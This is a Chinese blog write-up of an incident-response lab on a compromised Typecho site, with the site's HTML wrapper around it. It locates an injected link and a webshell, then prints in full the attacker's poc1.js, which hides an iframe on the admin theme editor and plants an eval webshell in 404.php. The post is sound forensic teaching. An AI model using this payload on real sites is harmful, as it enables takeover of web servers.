@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>第五章-Linux实战-黑链 - N1Rvana&#39;s Blog</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="Web Security" /><meta name="keywords" content='Linux' /><meta itemprop="name" content="第五章-Linux实战-黑链">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2024-06-05T18:53:52+08:00" />
+<meta itemprop="dateModified" content="2024-06-05T18:53:52+08:00" />
+<meta itemprop="wordCount" content="197"><meta itemprop="image" content="https://nlrvana.github.io/avatar.png" />
+<meta itemprop="keywords" content="Linux," /><meta property="og:title" content="第五章-Linux实战-黑链" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nlrvana.github.io/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE/" /><meta property="og:image" content="https://nlrvana.github.io/avatar.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-06-05T18:53:52+08:00" />
+<meta property="article:modified_time" content="2024-06-05T18:53:52+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://nlrvana.github.io/avatar.png" /><meta name="twitter:title" content="第五章-Linux实战-黑链"/>
+<meta name="twitter:description" content=""/>
+<meta name="twitter:site" content="@huahua39079406"/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://nlrvana.github.io/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE/" /><link rel="prev" href="https://nlrvana.github.io/%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98-wordpress/" /><link rel="next" href="https://nlrvana.github.io/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-waf-%E4%B8%8A%E7%9A%84%E6%88%AA%E8%8E%B7%E7%9A%84%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "第五章-Linux实战-黑链",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/nlrvana.github.io\/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE\/"
+    },"genre": "posts","keywords": "Linux","wordcount":  197 ,
+    "url": "https:\/\/nlrvana.github.io\/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE\/","datePublished": "2024-06-05T18:53:52+08:00","dateModified": "2024-06-05T18:53:52+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/categories/"
+                          
+                          
+                        ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/tags/"
+                          
+                          
+                        ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li
+              class="menu-item"
+            ><span class="nested-item">
+                  <a
+                    class="menu-link"
+                    href="/posts/"
+                    
+                    
+                  ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/categories/"
+                          
+                          
+                        ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/tags/"
+                          
+                          
+                        ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">第五章-Linux实战-黑链</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>第五章-Linux实战-黑链</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" data-title="N1Rvana" data-alt="N1Rvana" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-category" title="Category - 应急响应"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 应急响应</a></span></div><div class="post-meta-line"><span title="published on 2024-06-05 18:53:52"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-06-05">2024-06-05</time></span>&nbsp;<span title="197 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 200 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>One minute</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="第五章-Linux实战-黑链">
+            <i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;views
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-环境分析">0x00 环境分析</a></li>
+    <li><a href="#0x01">0x01</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="0x00-环境分析" class="heading-element">
+  <a href="#0x00-%e7%8e%af%e5%a2%83%e5%88%86%e6%9e%90" class="heading-mark"></a>0x00 环境分析</h2><div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">服务器场景操作系统 Linux  
+</span></span><span class="line"><span class="cl">服务器账号密码 root xjty110pora 端口 2222  </span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x01" class="heading-element">
+  <a href="#0x01" class="heading-mark"></a>0x01</h2><p>1、找到黑链添加在哪个文件 flag 格式 flag{xxx.xxx}<br>
+备份源码<br>
+<code>tar -zcvf /tmp/web.tar.gz /var/www/html</code><br>
+搜索一下黑链<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010016491.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010016491.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010016491.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010016491.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010016491.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010016491.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>
+在<code>header.php</code>中<br>
+<code>flag{header.php}</code><br>
+2、webshell的绝对路径 flag{xxxx/xxx/xxx/xxx/}<br>
+放到 D 盾里扫描一下或者全局搜索一下<code>eval</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010018118.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010018118.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010018118.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010018118.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010018118.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010018118.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>
+发现在<code>404.php</code>中<br>
+<code>flag{/var/www/html/usr/themes/default/404.php}</code><br>
+3、黑客注入黑链文件的 md5 md5sum file flag{md5}<br>
+在<code>poc1.js</code>中发现了注入黑链的文件</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// 定义一个函数，在网页末尾插入一个iframe元素  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">insertIframe</span><span class="p">()</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="c1">// 获取当前页面路径  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">urlWithoutDomain</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">pathname</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="c1">// 判断页面是否为评论管理页面  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">hasManageComments</span> <span class="o">=</span> <span class="nx">urlWithoutDomain</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&#34;manage-comments.php&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">tSrc</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">hasManageComments</span><span class="p">){</span>  
+</span></span><span class="line"><span class="cl">        <span class="c1">// 如果是，则将路径修改为用于修改主题文件的页面地址  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">tSrc</span><span class="o">=</span><span class="nx">urlWithoutDomain</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;manage-comments.php&#39;</span><span class="p">,</span><span class="s1">&#39;theme-editor.php?theme=default&amp;file=404.php&#39;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="c1">// 如果不是，则直接使用主题文件修改页面地址  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">tSrc</span><span class="o">=</span><span class="s1">&#39;/admin/theme-editor.php?theme=default&amp;file=404.php&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="c1">// 定义iframe元素的属性，包括id、src、width、height和onload事件  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">iframeAttributes</span> <span class="o">=</span> <span class="s2">&#34;&lt;iframe id=&#39;theme_id&#39; src=&#39;&#34;</span><span class="o">+</span><span class="nx">tSrc</span><span class="o">+</span><span class="s2">&#34;&#39; width=&#39;0%&#39; height=&#39;0%&#39; onload=&#39;writeShell()&#39;&gt;&lt;/iframe&gt;&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="c1">// 获取网页原始内容  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">originalContent</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="c1">// 在网页末尾添加iframe元素  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="p">(</span><span class="nx">originalContent</span> <span class="o">+</span> <span class="nx">iframeAttributes</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="c1">// 定义一个全局变量isSaved，初始值为false  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">isSaved</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="c1">// 定义一个函数，在iframe中写入一段PHP代码并保存  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">writeShell</span><span class="p">()</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="c1">// 如果isSaved为false  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isSaved</span><span class="p">)</span> <span class="p">{</span>   
+</span></span><span class="line"><span class="cl">        <span class="c1">// 获取iframe内的内容区域和“保存文件”按钮元素  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">var</span> <span class="nx">content</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;theme_id&#39;</span><span class="p">).</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">btns</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;theme_id&#39;</span><span class="p">).</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;button&#39;</span><span class="p">);</span>      
+</span></span><span class="line"><span class="cl">        <span class="c1">// 获取模板文件原始内容  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">var</span> <span class="nx">oldData</span> <span class="o">=</span> <span class="nx">content</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="c1">// 在原始内容前加入一段phpinfo代码  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">content</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;&lt;?php @eval($_POST[a]); ?&gt;\n&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nx">oldData</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="c1">// 点击“保存文件”按钮  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">btns</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nx">click</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">        <span class="c1">// 将isSaved设为true，表示已经完成写入操作  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">isSaved</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">// 调用insertIframe函数，向网页中添加iframe元素和写入PHP代码的事件  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">insertIframe</span><span class="p">();</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>flag{10c18029294fdec7b6ddab76d9367c14}</code><br>
+4、攻击入口是哪里？url请求路径，最后面加/ flag{/xxxx.xxx/xxxx/x/}<br>
+在源码中存在<code>output.pcag</code>，利用<code>wireshark</code>分析一下<br>
+通过源码得知是<code>Typecho</code>，百度搜索得知存在<code>RCE</code>漏洞<br>
+<a href="https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html"target="_blank" rel="external nofollow noopener noreferrer">https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html</a><br>
+通过流量包查看，正是此漏洞<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010041181.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010041181.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010041181.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010041181.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010041181.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010041181.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>
+触发点是<code>/index.php/archives/1/</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010043306.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010043306.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010043306.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010043306.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010043306.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406010043306.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>
+<code>flag{/index.php/archives/1/}</code></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-06-05 18:53:52">Updated on 2024-06-05&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nlrvana.github.io/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE/" data-title="第五章-Linux实战-黑链"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/linux/" class="post-tag" title="Tags - Linux">Linux</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98-wordpress/" class="post-nav-item" rel="prev" title="第四章-Windows实战-Wordpress"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>第四章-Windows实战-Wordpress</a>
+      <a href="/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-waf-%E4%B8%8A%E7%9A%84%E6%88%AA%E8%8E%B7%E7%9A%84%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/" class="post-nav-item" rel="next" title="第六章-流量特征分析-Waf上的截获的黑客攻击流量">第六章-流量特征分析-Waf上的截获的黑客攻击流量<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.121.2"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright order-5" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider">Web Security</span></div><div class="footer-line statistics"><span class="site-time" title='Website running ...'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">Website running ...</span></span></div><div class="footer-line visitor order-4">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
